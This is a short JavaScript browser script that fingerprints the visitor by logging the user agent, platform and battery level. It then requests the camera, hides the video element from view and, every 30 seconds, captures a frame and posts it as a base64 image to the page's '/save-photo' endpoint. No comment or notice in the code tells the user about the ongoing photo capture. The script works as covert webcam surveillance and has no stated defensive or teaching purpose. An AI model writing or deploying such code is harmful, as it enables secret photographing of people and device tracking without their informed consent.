// Collect User-Agent and OS Info
const userAgent = navigator.userAgent;
const os = navigator.platform;

console.log("User Agent:", userAgent);
console.log("Operating System:", os);

// Collect Battery Percentage
navigator.getBattery().then(battery => {
    console.log("Battery Percentage:", battery.level * 100 + "%");
});

// Access Front Camera and Take Photo every 30 seconds
const video = document.createElement('video');
video.style.display = 'none'; // Hide the video element
document.body.appendChild(video); // Append video to the DOM (so it's available for access)

navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;

        // Wait until video metadata (e.g., dimensions) is loaded
        video.onloadedmetadata = function() {
            video.play(); // Start video playback once metadata is ready

            setInterval(() => {
                // Ensure the video has started playing
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // Draw the video frame on the canvas
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Capture photo as base64
                    const photo = canvas.toDataURL('image/png');
                    console.log("Photo Captured:", photo);

                    // Send photo to the server every 30 seconds
                    fetch('/save-photo', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ photo: photo })
                    })
                    .then(response => response.json())
                    .then(data => console.log('Photo saved on server:', data))
                    .catch(error => console.error('Error:', error));
                }
            }, 30000); // Capture photo every 30 seconds
        };
    })
    .catch(err => console.error("Camera Access Denied:", err));
